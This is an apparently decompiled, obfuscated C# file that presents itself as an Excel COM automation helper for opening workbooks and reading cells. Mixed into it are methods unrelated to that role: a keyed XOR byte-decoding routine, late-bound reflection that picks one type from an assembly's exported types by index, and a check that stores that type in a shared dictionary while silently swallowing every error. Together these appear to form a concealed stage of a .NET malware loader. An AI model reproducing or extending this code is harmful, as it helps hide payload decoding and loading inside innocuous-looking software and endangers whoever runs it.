using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using Ga1;
using Microsoft.VisualBasic.CompilerServices;
using Nt3;
using Tp3;
using Zk30;
using w2L8;

namespace e8F;

public class Jg3
{
	private Xd0 _oXls;

	private t4K _oWBook;

	private q9A6 _oSheet;

	public Xd0 OXls
	{
		get
		{
			return _oXls;
		}
		set
		{
			_oXls = value;
		}
	}

	public t4K OWBook
	{
		get
		{
			return _oWBook;
		}
		set
		{
			_oWBook = value;
		}
	}

	public q9A6 OSheet
	{
		get
		{
			return _oSheet;
		}
		set
		{
			_oSheet = value;
		}
	}

	public Jg3()
	{
		_oXls = (Xd0)Activator.CreateInstance(Marshal.GetTypeFromCLSID(new Guid("00024500-0000-0000-C000-000000000046")));
	}

	public void d1B(string q3X, bool m6J)
	{
		OWBook = OXls.Workbooks.Open(q3X, RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing));
		OXls.Visible = m6J;
	}

	internal static bool Wg7()
	{
		try
		{
			try
			{
				Type type = (Type)Bp4(RuntimeHelpers.GetObjectValue(i2HW.mDic["Deep"]));
				if (Operators.CompareString(type.Name, i2HW.mDic[i2HW.tName].ToString(), false) == 0)
				{
					i2HW.mDic.Add(i2HW.T, type);
					return true;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		return false;
	}

	public void z2B(string Sb2)
	{
		OSheet = (q9A6)OWBook.Sheets[Sb2];
	}

	public Cc0 x6G(int i5N, int w2B)
	{
		return (Cc0)OSheet.Cells[i5N, w2B];
	}

	public void t3M(bool Hb6)
	{
		if (OWBook != null)
		{
			OWBook.Close(Hb6, RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing));
		}
		OXls.Quit();
		Xd0 Hi = OXls;
		j3T(ref Hi);
		OXls = Hi;
	}

	internal static byte Tz7(byte r3B, byte[] n8K, int o6J, int Jd6)
	{
		r3B = (byte)(r3B ^ checked((byte)(n8K[unchecked(Jd6 % n8K.Length)] ^ ((Jd6 + unchecked(o6J % n8K.Length)) & o6J))));
		return r3B;
	}

	private static void j3T<m4W>(ref m4W Hi9, bool Fs6 = false) where m4W : class
	{
		if (Hi9 == null)
		{
			return;
		}
		try
		{
			if (Marshal.IsComObject(Hi9))
			{
				if (Fs6)
				{
					Marshal.FinalReleaseComObject(Hi9);
				}
				else
				{
					Marshal.ReleaseComObject(Hi9);
				}
			}
		}
		finally
		{
			Hi9 = null;
		}
	}

	internal static object Bp4(object f0Y)
	{
		return NewLateBinding.LateIndexGet(NewLateBinding.LateGet(f0Y, (Type)null, "GetExportedTypes", new object[0], (string[])null, (Type[])null, (bool[])null), new object[1] { 27 }, (string[])null);
	}
}
